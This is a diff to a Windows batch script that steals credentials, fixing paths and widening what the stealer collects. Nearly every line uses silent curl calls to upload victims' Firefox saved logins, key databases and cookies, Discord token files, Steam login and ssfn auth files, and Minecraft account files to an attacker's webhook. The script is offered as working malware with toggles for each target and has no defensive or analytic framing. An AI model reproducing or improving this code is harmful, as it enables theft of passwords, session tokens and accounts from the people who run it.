@@ -68,7 +68,7 @@ curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Ty
 for /f %%f in ('dir /b %appdata%\Mozilla\Firefox\Profiles') do (
 		curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\logins.json %webhook%
 		curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\key3.db %webhook%
-		curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\key3.db %webhook%
+		curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\key4.db %webhook%
 		curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\cookies.sqlite %webhook%
 		pause
 	)
@@ -84,10 +84,10 @@ curl --silent --output /dev/null -F c=@%localappdata%\osu!\osu!.%username%.cfg %
 :: DISCORD - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 goto skipdiscord
 curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- DISCORD -```\"}"  %webhook%
-for /f %%f in ('dir /b %appdata%\discord"\Local Storage"\leveldb\') do (
+for /f %%f in ('dir /b %appdata%\discord\Local" "Storage\leveldb\') do (
 	echo %%f|find ".ldb"
 	if errorlevel 1 (@echo off) else (
-		curl --silent --output /dev/null -F level=@%appdata%\discord"\Local Storage"\leveldb\%%f %webhook%
+		curl --silent --output /dev/null -F level=@%appdata%\discord\Local" "Storage\leveldb\%%f %webhook%
 	)
 )
 :skipdiscord
@@ -95,18 +95,20 @@ for /f %%f in ('dir /b %appdata%\discord"\Local Storage"\leveldb\') do (
 :: STEAM - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 goto skipsteam
 curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- STEAM -```\"}"  %webhook%
-curl --silent --output /dev/null -F steamusers=@C:"\Program Files (x86)"\Steam\config\loginusers.vdf %webhook%
-curl --silent --output /dev/null -F loginusers=@C:"\Program Files"\Steam\config\loginusers.vdf %webhook%
-for /f %%s in ('dir /b C:"\Program Files (x86)"\Steam\') do (
+curl --silent --output /dev/null -F steamusers=@C:\Program" "Files" "(x86)\Steam\config\loginusers.vdf %webhook%
+curl --silent --output /dev/null -F loginusers=@C:\Program" "Files\Steam\config\loginusers.vdf %webhook%
+for /f %%s in ('dir /b C:\Program" "Files" "(x86)\Steam\') do (
 	echo %%s|find "ssfn"
 	if errorlevel 1 (@echo off) else (
-		curl --silent --output /dev/null -F auth=@C:"\Program Files (x86)"\Steam\%%s %webhook%
+		curl --silent --output /dev/null -F auth=@C:\Program" "Files" "(x86)\Steam\%%s %webhook%
+		curl --silent --output /dev/null -F auth=@C:\Program" "Files\Steam\%%s %webhook%
 	)
 )
-for /f %%s in ('dir /b /a:h C:"\Program Files (x86)"\Steam\') do (
+for /f %%s in ('dir /b /a:h C:\Program" "Files" "(x86)\Steam\') do (
 	echo %%s|find "ssfn"
 	if errorlevel 1 (@echo off) else (
-		curl --silent --output /dev/null -F auth=@C:"\Program Files (x86)"\Steam\%%s %webhook%
+		curl --silent --output /dev/null -F auth=@C:\Program" "Files" "(x86)\Steam\%%s %webhook%
+		curl --silent --output /dev/null -F auth=@C:\Program" "Files\Steam\%%s %webhook%
 	)
 )
 :skipsteam
@@ -117,10 +119,6 @@ curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Ty
 curl --silent --output /dev/null -F steamusers=@%appdata%\.minecraft\launcher_profiles.json %webhook%
 curl --silent --output /dev/null -F steamusers=@%appdata%\.minecraft\launcher_accounts.json %webhook%
 :skipminecraft
-
-curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- MS PROTECT -```\"}"  %webhook%
-::curl --silent --output /dev/null -F steamusers=@%appdata%\.minecraft\launcher_profiles.json %webhook%
-:skipprotect
 
 :: INFORMATION ABOUT THE PROCESS
 :: -----------------------------
